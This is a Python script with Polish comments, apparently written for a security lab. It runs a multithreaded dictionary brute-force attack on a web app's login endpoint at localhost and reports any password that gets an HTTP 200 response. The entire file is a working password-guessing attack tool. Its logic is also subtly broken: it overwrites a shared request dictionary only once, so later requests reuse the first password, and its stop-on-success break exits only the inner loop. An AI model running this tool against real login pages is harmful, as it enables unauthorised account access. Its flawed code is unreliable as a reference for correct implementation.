import sys
import requests

#importujemy bibliotki do wykonywania zadań w wielu wątkach jednocześnie oraz do wyświetlania postępu
from concurrent.futures import ThreadPoolExecutor, as_completed
import tqdm

#importujemy funckje która pozwala nam na dzielenie listy na mniejsze "paczki"
from itertools import islice

SLICE_SIZE = 1000
WORKERS=20

URL = "http://localhost:3000/rest/user/login" #adres URL strony
WORDLIST_FILE = "lab 12/directory-list-2.3-medium.txt" #ścieżka do słownika haseł

#można dodać nagłowek jesli strona tego wymaga
HEADERS = {

}

#tworzymy strukturę danych która będzie wysyłana w zapytaniu POST
POST = {
    "email": "temp@mail.com",
    "password": "TARGET"
}

#funnckja która wykonuje atak słownikowy na podany url
def brute_force_login(url, password):

    for key in POST.keys():
        if POST[key] == "TARGET":
            POST[key]=password
    
    #jeśli nagłowek jest pusty, wysyłamy zapytanie bez nagłówka
    if HEADERS == {}:
        #wysyłamy zapytanie POST z danymi logowania, jesli status code to 200, oznacza ze mamy hasło
        response = requests.post(url, json=POST)
        if response.status_code == 200:
            return password
    else:
        #wysyłamy zapytanie POST z danymi logowania, jesli status code to 200, oznacza ze mamy hasło
        response = requests.post(url, json=POST, headers=HEADERS)
        if response.status_code == 200:
            return password
    return None

if __name__ == "__main__":
    try:
        with open(WORDLIST_FILE, 'r') as wordlist:
            #otwieramy pulę wątków, max_workers=20 oznacza że jednocześnie będzie sprawdzanych 20 haseł
            with ThreadPoolExecutor(max_workers=WORKERS) as executor:
                
                #tworzymy własny pasek postępu, total to liczba haseł w słowniku, desc to opis paska, unit to jednostka
                progress = tqdm.tqdm(total=sum(1 for _ in wordlist), desc="Brute forcing hasła", unit="hasło")
                
                #resetujemy wskaźnik pliku na początek, aby móc ponownie czytać hasła
                wordlist.seek(0)
                while True:
                    
                    #dzielimy słownik na mniejsze paczki, aby nie ładować całego słownika do pamięci naraz
                    paczka = list(islice(wordlist, SLICE_SIZE))
                    
                    #jeśli paczka jest pusta, oznacza że doszliśmy do końca słownika
                    if not paczka:
                        break
                    
                    #pula wątków
                    futures = []
                    for password in paczka:
                        password = password.strip()
                        
                        #dodajemy zadanie sprawdzenia hasła do puli wątków
                        future = executor.submit(brute_force_login, URL, password)
                        futures.append(future)
                    
                    #sprawdzamy wyniki z puli wątków, i jesli któreś hasło jest poprawne, wyświetlamy je i przerywamy skanowanie
                    for future in as_completed(futures):
                        result = future.result()
                        if result is not None:
                            tqdm.tqdm.write(f"hasło znalezione: {result}")
                            break
                    
                    #przesuwamy pasek postępu o liczbę haseł w paczce
                    progress.update(len(paczka))
                
                #wyświetlamy komunikat że skanowanie zakończone, i zamykamy pasek postępu
                tqdm.tqdm.write("koniec skanowania")
                progress.close()

    except KeyboardInterrupt:
        print("skan przerwany przez użytkownika.")
        #wychodzimy z programu z kodem -1
        sys.exit(-1)
    except Exception as e:
        print(f"Error: {e}")
